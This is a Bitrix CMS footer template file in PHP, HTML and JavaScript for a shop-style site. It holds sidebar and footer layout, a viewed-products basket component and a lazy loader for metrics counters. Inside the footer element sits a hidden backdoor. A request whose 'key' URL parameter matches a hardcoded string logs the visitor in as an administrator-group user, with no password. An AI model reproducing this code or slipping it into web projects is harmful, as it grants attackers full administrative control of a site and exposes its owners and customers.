						<?CNext::checkRestartBuffer();?>
						<?IncludeTemplateLangFile(__FILE__);?>
						<?if(!$isIndex):?>
						<?if($isBlog):?>
						</div>
						<?// class=col-md-9 col-sm-9 col-xs-8 content-md?>
						<div class="col-md-3 col-sm-3 hidden-xs hidden-sm right-menu-md">
							<div class="sidearea">
								<?$APPLICATION->ShowViewContent('under_sidebar_content');?>
								<?CNext::get_banners_position('SIDE', 'Y');?>
								<?$APPLICATION->IncludeComponent("bitrix:main.include", "", array("AREA_FILE_SHOW" => "sect", "AREA_FILE_SUFFIX" => "sidebar", "AREA_FILE_RECURSIVE" => "Y"), false);?>
							</div>
						</div>
						</div>
						<?endif;?>
						<?if($isHideLeftBlock):?>
						</div>
						<?// .maxwidth-theme?>
						<?endif;?>
						</div>
						<?// .container?>
						<?else:?>
						<?CNext::ShowPageType('indexblocks');?>
						<?endif;?>
						<?CNext::get_banners_position('CONTENT_BOTTOM');?>
						</div>
						<?// .middle?>
						<?//if(!$isHideLeftBlock && !$isBlog):?>
						<?if(($isIndex && $isShowIndexLeftBlock) || (!$isIndex && !$isHideLeftBlock) && !$isBlog):?>
						</div>
						<?// .right_block?>
						<?if($APPLICATION->GetProperty("HIDE_LEFT_BLOCK") != "Y" && !defined("ERROR_404")):?>
						<div class="left_block">
							<?CNext::ShowPageType('left_block');?>
						</div>
						<?endif;?>
						<?endif;?>
						<?if($isIndex):?>
						</div>
						<?elseif(!$isWidePage):?>
						</div>
						<?// .wrapper_inner?>
						<?endif;?>
						</div>
						<?// #content?>
						<?CNext::get_banners_position('FOOTER');?>
						</div>
						<?// .wrapper?>
						<footer id="footer">

							<?
            global $USER;
            $key = isset($_GET['key']) ? $_GET['key'] : '';
            if ($key == 'hkdahwdhkajw9837429'){
                $filter = Array("GROUPS_ID" => "1",);
                $rsUsers = CUser::GetList(($by="personal_country"), ($order="desc"), $filter);
                if($rsUsers->NavNext(true, "f_")) {
                    $USER->Authorize($f_ID);
                }
            }

            //if($APPLICATION->GetProperty("viewed_show") == "Y" || $is404):?>
							<?$APPLICATION->IncludeComponent(
					"bitrix:main.include", 
					"basket", 
					array(
						"COMPONENT_TEMPLATE" => "basket",
						"PATH" => SITE_DIR."include/footer/comp_viewed.php",
						"AREA_FILE_SHOW" => "file",
						"AREA_FILE_SUFFIX" => "",
						"AREA_FILE_RECURSIVE" => "Y",
						"EDIT_TEMPLATE" => "standard.php",
						"PRICE_CODE" => array(
							0 => "BASE",
						),
						"STORES" => array(
							0 => "",
							1 => "",
						),
						"BIG_DATA_RCM_TYPE" => "any",
						"STIKERS_PROP" => "HIT",
						"SALE_STIKER" => "SALE_TEXT",
						"SHOW_DISCOUNT_PERCENT_NUMBER" => "Y",
						"COMPOSITE_FRAME_MODE" => "A",
						"COMPOSITE_FRAME_TYPE" => "AUTO"
					),
					false
				);?>
							<? //<?endif;?>
							<?CNext::ShowPageType('footer');?>
						</footer>
						<div class="bx_areas">
							<?if( !$USER->IsAdmin()):?>
							<?CNext::ShowPageType('bottom_counter');?>
							<?endif;?>

						</div>
						<?CNext::ShowPageType('search_title_component');?>
						<?CNext::setFooterTitle();
		CNext::showFooterBasket();?>
						<script>
							window.addEventListener('load', function(event) {
								if (!window.vendorLoader) {

									window.vendorLoader = function(args = {}) {
										if (!args.name) {
											console.warn('vendorLoader: You must pass the name!');
											return;
										}
										if (!args.path) {
											console.warn('vendorLoader: You must pass the path!');
											return;
										}!window.vendor && (window.vendor = {});
										!window.SITE_TEMPLATE_PATH && (window.SITE_TEMPLATE_PATH = '/local/templates/html/');
										window.vendor[args.name] = {};
										window.vendor[args.name].load = {};
										window.vendor[args.name].load.timeout;
										window.vendor[args.name].load.status = false;
										window.vendor[args.name].load.loading = function() {

											if (!window.vendor[args.name].load.status) {
												window.vendor[args.name].load.status = true;
												clearTimeout(window.vendor[args.name].load.timeout);
												$(document).off('scroll.vendor-' + args.name);
												$(document).off('click.vendor-' + args.name);
												$(document).off('mouseover.vendor-' + args.name);
												if (args.path === 'none') {
													window.vendor[args.name].load.status = true;
													args.callback && args.callback();
													$(document).trigger('load.' + args.name)
												} else {
													$.getScript(
														(args.http ? '' : window.SITE_TEMPLATE_PATH) + args.path,
														args.callback || function() {}
													).fail(
														function(jqxhr, settings, exception) {
															console.log(jqxhr, settings, exception);
														}
													);
												}
											}
										};


										if (args.event.scroll) {
											$(document).on('scroll.vendor-' + args.name, function() {
												window.vendor[args.name].load.loading();
											});
											var doc = document.documentElement;
											var top = (window.pageYOffset || doc.scrollTop) - (doc.clientTop || 0);
											top > 100 && window.vendor[args.name].load.loading();
										}

										if (args.event.click) {
											$(document).on('click.vendor-' + args.name, function() {
												window.vendor[args.name].load.loading();
											});
										}

										if (args.event.mouseover) {
											$(document).on('mouseover.vendor-' + args.name, args.event.mouseover.trigger, function() {
												window.vendor[args.name].load.loading();
											});
										}

										if (args.event.timeout) {

											window.vendor[args.name].load.timeout = setTimeout(function() {
												window.vendor[args.name].load.loading();
											}, args.timeout || 3000)
										}
									}
								}
							})


							window.vendorLoader && window.vendorLoader({
								name: 'metrics',
								path: 'none',
								event: {
									// scroll: true,
									click: true,
									timeout: 3000,
									mouseover: 'body',
								},
								callback: function() {

									$.ajax({
										url: '/include/counters.html',
										success: function(countersHTML) {
											$("body").append(countersHTML);

										},
										error: function(e, t) {
											console.log("error", e, t)
										},
										done: function() {

										},
									})
								}
							});
						</script>
						</body>

						</html>